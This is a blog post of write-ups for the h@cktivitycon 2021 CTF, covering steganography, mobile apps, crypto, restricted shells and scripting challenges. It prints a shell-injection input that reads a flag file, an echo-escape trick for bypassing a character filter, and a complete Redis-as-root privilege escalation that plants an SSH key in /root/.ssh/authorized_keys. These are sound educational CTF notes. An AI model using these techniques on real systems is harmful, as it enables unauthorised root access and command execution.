+++
author = "pshegger"
title = "h@cktivitycon 2021 CTF"
date = "2021-09-20"
description = "Writeups and my thoughts about the 2021 h@cktivitycon CTF"
tags = [
    "ctf",
    "writeup",
    "hacktivitycon",
    "hackerone",
    "cryptography",
    "python"
]
categories = [
    "ctf"
]
toc = true
related = true
social_share = true
+++

This year’s [h@cktivitycon](https://www.hackerone.com/hacktivitycon) was held last Saturday, but even before it started, there was another event HackerOne had organized: this year’s CTF. It began on Thursday and ran for 48 hours. As I wasn’t following the events, it was already Friday when I realized it was running. I still had a bit more than a day to complete as many challenges as possible, so I decided to register and see how it goes.

Even though I already had some experience with CTFs, this was my first time participating in an event while it was running. Previously I only tried the challenges after the event had ended, so there was zero time pressure. I’m also not a security professional, most of the challenges are too hard for me, but I hoped I could find a few that I could solve and enjoy. Luckily there were challenges for every skill level, so I could find the ones suitable for me. Let’s see them.

## Warmup

It was instantly clear that I should start at the warmup category. These challenges were not too hard, but they were a fun place to begin.

### Read The Rules

This was probably the easiest challenge in the whole event. As the title says, you just had to go to the rules page and find the flag in a comment in the page's source code.

### Pimple

This challenge started by downloading a file with no extension. I did what I usually do when I have a file, and I don’t know what kind of file is: open it in a hex editor. After a glance at the header, I knew that I had an `xcf` file in front of me, so I added the extension and opened it in GIMP. I had no idea how to continue from this point, so I just started to show/hide the layers. Luckily, this was all I had to do; I found one with the flag after hiding a few of the top layers.

### Bass64

This was also one of the easier challenges. You got a file that turned out to be a simple text file. When I first opened it, it looked like it contained only random characters, but I quickly realized that I had to turn off line wrapping in my text editor to see the content as it was supposed to be seen. After that, I could see the ASCII art for the flag. After reading it, I pasted it into the website, and it was correct.

### Tsunami

This challenge also started by downloading a file without an extension, so I opened it in a hex editor again. The header proved to be useful again, and it showed that I got a `wav` file this time. I've seen this type of challenge before, so I had a strong feeling that the flag was hidden in the file's spectrogram. After finding software capable of displaying it, it confirmed my suspicion, and I found the next flag in no time.


### 2ez

This challenge also started with downloading an unknown file, so I started with my hex editor again. The first thing I realized was the `JFIF` part in the file header, so I knew it was a jpg file. I also realized that the start of the header was weird, so I opened a random jpg file on my machine and checked it too. It quickly became clear that the first 4 bytes were modified, so I edited them to contain the correct value (`0xFF 0xD8 0xFF 0xE0`). All that remained was to add the correct extension and open it.

### Target Practice

We also got a file to download for this challenge, but it had a `.gif` extension this time. When you opened it, you could see concentric circles in the middle and some dots around it. The dots were changing with every frame. I had the suspicion that I was looking at some kind of 2d barcode, but I had to check it. After some googling, I could confirm that I was right, and each frame contained a Maxi Code.

I wrote a small script to export every frame as a separate file. As the gif contained only 22 frames, I decided to check each one by hand as it would have taken more time to write a script for that. In the end, I found the flag in one of the frames.

```python
#!/usr/bin/env python3

from PIL import Image

with Image.open("target_practice.gif") as im:
    for i in range(im.n_frames):
        im.seek(i)
        im.save(f"target_practice/frame{i}.gif")
```

### Six Four Over Two

For this challenge, the solution was hinted at in the title and in the description (`cover all the bases`). With these hints, I realized that I was looking at a `base32` encoded text, so I decoded it, and that was all I had to do.

### Butter Overflow

This time the downloadable file was a source code for a small program written in c. After reading it, you could see multiple things:

1. the handler for a segfault calls the `give_flag` method
2. the program reads input to a buffer with a length of `0x200`
3. the length of the input is not validated

With the above information, we can quickly realize that all we have to do is cause a buffer overflow with our input, so I generated a long enough string of `a`s pasted it into the terminal and got the flag.

## Web

### Confidentiality

For this challenge, we were presented with a website with one input field. The site stated that we could pass any path as input, and it would show the files in the given folder. After trying it with the given example, I had the assumption that the site was running `ls -l {user_input}` and showed the result. This, of course, would mean that we can use shell injection to run any command on the system, and with that, to get the flag.

I quickly tried `; ls` as an input, and when I got the current working directory listed twice (first for the original `ls -l` and a second time for my injected `ls`), it confirmed my assumption. I also saw a file called `flag.txt`, so I tried getting its content with `; cat flag.txt`, which worked, and with that, I had the flag.

## Cryptography

### N1TP

After connecting to the service, we got an encrypted string and the opportunity to try the encryption ourselves. After trying it with some random input Nina (the author of the encryption tool) mentions one-time pad. Then I tried another input, but this time instead of an arbitrary string, I used one that had the same format as the flag (`flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}` in this case). Comparing the result to the original encrypted string, I realized that the first 10 character was the same in both texts.

This made me think that the key is reused for the encryption, so I started to look into attack vectors for this. I quickly found that I could use a technic called `Crib Dragging`, so I searched for an online version and found [this](http://cribdrag.com/) site. After providing the required and known info, the site quickly decrypted the original encrypted text, and with that, I got another flag.

## Mobile

### To Do

We had to download an `apk` file for this challenge and extract the flag from that. I started by installing the app on my phone and running it to get a general idea about how it works. After starting the app, I saw a login screen that asked for the password. At this point, I launched [Bytecode Viewer](https://github.com/Konloch/bytecode-viewer) on my computer and opened the apk with it. I navigated to the source of the `LoginActivity`, and after some reading, I found which class contains the code for checking the password. I opened that file too, and to my surprise, the check was only an if statement with the password in plain text. I went back to the application on my phone and tried the password, and it worked, so I got access to the to-do items stored in the database. The first item was the flag itself, so I submitted it and went on to the next challenge.

### Reactor

After my success with the previous challenge, I felt like I had to try this too, even though this was a medium-difficulty one, and I completed only easy ones so far. I downloaded the apk, installed it, and was presented with a PIN entry screen. When you entered any code, you got a string that changed with the PIN. This meant that the PIN was probably used as a decryption key for the encrypted flag.

I opened the apk with Bytecode Viewer again, and after finding the `MainActivity`, I saw that it's a subclass of `ReactActivity`. This meant that we had a React Native application this time, which was unlucky because I couldn't use my Android knowledge. After some search, I found that the source for the app is in `/assets/index.android.bundle`. I opened the file, but it was obfuscated, so I took a break before trying to understand it.

To pass some time while I was gathering strength for understanding the obfuscated code, I tried various random PINs in the app. I quickly realized that the first character of the resulting decrypted text only depends on the first number in the PIN. After that, I checked if the 2nd character is dependent only on the 2nd number of the PIN or not, and it was. That was also true for the 3rd and 4th characters. This meant that I could guess the numbers 1-by-1, and instead of trying all the 10000 possible combinations, I could find the correct PIN in a maximum of 40 tries.

With that knowledge, I started to search by only changing the first digit of the PIN until the output began with an `f`. After I got the first digit, I repeated the previous step for digits 2-4 until, in the end, I got the correct PIN, and with that, another flag.

## Miscellaneous

### Bad Words

We were presented with a shell in this challenge, and we had to find the flag there. I tried running `ls`, but it was forbidden because it contained a "bad word". After trying some other basic commands, I had to realize that all of them were forbidden.

At this point, I randomly tried to call `ls` with its full path (`/bin/ls`), and to my surprise, it worked. After this, all I had to do was traversing the directory structure using `/bin/ls` and printing the flag with `/bin/cat` once I found it.

```bash
user@host:/home/user$ /bin/cat just/out/of/reach/flag.txt
/bin/cat just/out/of/reach/flag.txt
flag{2d43e30a358d3f30fe65cc47a9cbbe98}
```

### Shelle

In this challenge, we got access to a shell with some limitations. We only had a few commands that we could use, but `ls` was one of them, so I ran it. In the output, I’ve seen that there's an `assignment.txt` in the current folder, so I printed it. It was a task list for the students who were supposed to use the system, but it also said that the flag is in `/opt`. I tried to print the flag using `cat`, but I got an error that my command contained an illegal character.

After some trial, I found that `/` was illegal (among a few other characters). I tried to bypass the check by encoding the character, but it wasn't working at first. After some googling, I found that I have to use the `-e` flag for echo to enable interpreting backslash-escaped characters (FYI: I'm using Mac OS, and the version of `echo` there doesn't require any flag for escaping to work correctly). After this realization, I could craft a command that could print the flag, and it worked flawlessly.

```bash
> cat $(echo -e "\x2fopt\x2fflag.txt")
```

### Redlike

This challenge was my favorite. All we got is an SSH command and a password for connecting to a remote server. Our task was to gain root access and read the flag in `/root`. I had no idea how to start, so I began to look into basic things after connecting to the remote machine. I've seen that the machine is running Ubuntu 20.4 LTS with a recent kernel. I tried to look for local privilege escalations in these but with no luck.

After some search, I stumbled upon [this](https://payatu.com/guide-linux-privilege-escalation) article about a few basic ideas on how to start in these scenarios. I tried the techniques one-by-one, and 2 of them looked like a possible solution. First, I tried to see if I could exploit the cron jobs to create a root shell, but I had no success. After that, my attention shifted to the other possibility. I'd previously seen that there's a Redis server running as root. In the article, they showed us an example for MySQL running as root, but I thought it was worth trying.

After some research, I found [this](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) article explaining how we can use Redis to add our own ssh key to any user's authorized keys. I followed the steps, and after only a few minutes, I could SSH to localhost as root and read the flag.

```bash
user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:j7Uxe4PP+dP9nO+uvWzTbJUdbN5n2FyckwGXbnTFAyg user@redlike-44e6479a7e6be38a-6559588cdd-ww42g
The key\'s randomart image is:
+---[RSA 3072]----+
|            .ooo+|
|         E .  .=o|
|          .   +.*|
|               Xo|
|        S +   ++B|
|         + *  .oO|
|        . = o  +=|
|           + oo=B|
|            +.+X%|
+----[SHA256]-----+
user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli flushall
OK
user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ cat foo.txt | redis-cli -x set crackit
OK
user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli
127.0.0.1:6379> config set dir /root/.ssh/
OK
127.0.0.1:6379> config get dir
1) "dir"
2) "/root/.ssh"
127.0.0.1:6379> config set dbfilename "authorized_keys"
OK
127.0.0.1:6379> save
OK
127.0.0.1:6379>
user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls
flag.txt
root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt
flag{69dc14707af23b728ebd1363715ec890}
```

## Scripting

### Words Church

There's not too much to write about this challenge; we had to find words in a grid. The catch was that we had to find a total of 150 words (with the grid changing after every 5th word), so it would've taken too much time to do it by hand. For this reason, I wrote a script that connected to the server, parsed the grid every time we got a new one and searched for the word in the grid with a simple brute force algorithm. You can find the script [here](https://gist.github.com/PsHegger/1c122885e81d84bafcd3641fe82d6fb7).

### OTP Smasher

In this challenge, we were presented with a website that contained only an image and a form with one input field. The picture had only a few numbers on a black background. I tried entering the number on the image into the form, and after I submitted it, I got back the same page but with a few changes: a counter number increased by 1, and the image had changed. After checking the Chrome Developer console, I could also see that the site was trying to load `flag.png`, but the server returned `404`. After entering the numbers on the image a few more times, I realized something: the counter sometimes goes up, but sometimes it resets even when I enter the correct number. I assumed that the counter resets when too much time passes between entering two numbers. I didn’t know how many times I had to enter the number, so I wrote a script to automate the task.

I started by looking into some kind of OCR I could use, and I quickly found [Tesseract](https://github.com/tesseract-ocr/tesseract). I wrote a script to download the image from the server, run OCR on it, and send the recognized number back to the server. This ran in a loop, and every time after it submitted a code, I tried to download the flag. When it was available, I saved it and ended the loop.

In theory, it was a good approach, but for some reason, it always failed after solving a few images. After debugging a bit, I saw that Tesseract didn't recognize the number correctly, so I started to look into solutions to make it more reliable. After searching a bit, I found that I could set a whitelist for characters to be used. I set up the whitelist to only contain the numbers 0-9, but the recognition was still unreliable even after that.

After trying a few things (settings various recognition options, cropping the picture to only contain the numbers), I found the correct solution: I had to invert the colors of the image so that the background becomes white and the text on it becomes black (I used [ImageMagick](https://imagemagick.org/) for this). This simple change instantly solved all my problems. In the end, I needed two commands to get the number from the image:

1. invert the colors of the image: `convert otp.png -channel RGB -negate otp.png`
2. run OCR on the image: `tesseract -l eng otp.png otp -c tessedit_char_whitelist=0123456789`

You can find the full script [here](https://gist.github.com/PsHegger/b0af5e24831c6b700854c9fc282d445c).

---

## Conclusions

In the end, I solved 17 challenges, mainly the easy ones, but I managed to solve 5 medium ones too. 4 of these medium ones wasn't solved by enough people to have their score reduced to the minimum 50 points, so I'm delighted that I managed to do them.

I got 1838 points, and with that, my team (with me being the only member in it) finished at 186th place (out of 1721 teams).

I think this is a pretty good result for my first CTF, and it encourages me to participate in other ones in the future. In the past, I was reluctant to these events because I was afraid that my knowledge was not enough to enjoy it. After this one, I see that even if I cannot solve a challenge, I can still enjoy it and learn a lot, especially that it makes me want to know the solutions and read the writeups after the event has ended.